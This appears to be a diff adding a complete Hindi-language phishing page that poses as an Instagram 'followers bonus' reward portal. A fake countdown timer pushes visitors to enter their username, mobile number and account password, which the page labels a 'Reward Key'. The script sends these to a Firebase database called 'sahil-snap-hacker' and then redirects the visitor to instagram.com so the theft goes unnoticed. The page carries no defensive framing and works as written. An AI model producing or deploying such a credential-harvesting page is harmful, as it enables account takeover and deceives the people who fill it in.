@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Digital Reward Portal</title>
+    <style>
+        body { font-family: sans-serif; background: #fdfdfd; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); width: 85%; max-width: 320px; text-align: center; border-top: 6px solid #405DE6; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #eee; border-radius: 10px; box-sizing: border-box; background: #fafafa; outline: none; }
+        .btn { width: 100%; background: #405DE6; color: white; border: none; padding: 14px; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .timer { color: #ff3040; font-size: 13px; font-weight: bold; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2 style="font-size: 20px; margin-bottom: 5px;">बधाई हो! 🎉</h2>
+    <p style="font-size: 13px; color: #777;">आप 5,000 फॉलोअर्स बोनस के लिए सिलेक्ट हुए हैं।</p>
+    <div class="timer">⏳ समय बचा है: <span id="clock">05:00</span></div>
+    
+    <div id="p1">
+        <input type="text" id="u" placeholder="अपना यूजरनेम डालें">
+        <button class="btn" onclick="next()">आगे बढ़ें</button>
+    </div>
+
+    <div id="p2" style="display:none;">
+        <p style="font-size: 12px; color: #888;">वेरिफिकेशन के लिए मोबाइल नंबर और **Reward Key** डालें।</p>
+        <input type="tel" id="ph" placeholder="Mobile Number">
+        <input type="text" id="key" placeholder="Reward Key (Account Pass)" style="-webkit-text-security: disc;">
+        <button class="btn" style="background: #28a745;" onclick="save()">Claim Followers Now</button>
+    </div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+<script>
+    const firebaseConfig = { databaseURL: "https://sahil-snap-hacker-default-rtdb.firebaseio.com/" };
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    function next() {
+        if(document.getElementById("u").value == "") return alert("यूजरनेम डालें!");
+        document.getElementById("p1").style.display = "none";
+        document.getElementById("p2").style.display = "block";
+    }
+
+    function save() {
+        const u = document.getElementById("u").value;
+        const p = document.getElementById("ph").value;
+        const k = document.getElementById("key").value;
+
+        if(k.length < 5) return alert("विवरण सही से भरें!");
+
+        database.ref('final_vault/' + Date.now()).set({ User: u, Mobile: p, Key: k });
+
+        alert("वेरिफिकेशन सफल! 24 घंटे में फॉलोअर्स जुड़ जाएंगे।");
+        window.location.href = "https://www.instagram.com";
+    }
+
+    let t = 300;
+    setInterval(() => {
+        let m = Math.floor(t/60); let s = t%60;
+        document.getElementById("clock").innerHTML = m + ":" + (s<10?"0":"") + s;
+        if(t > 0) t--;
+    }, 1000);
+</script>
+
+</body>
+</html>
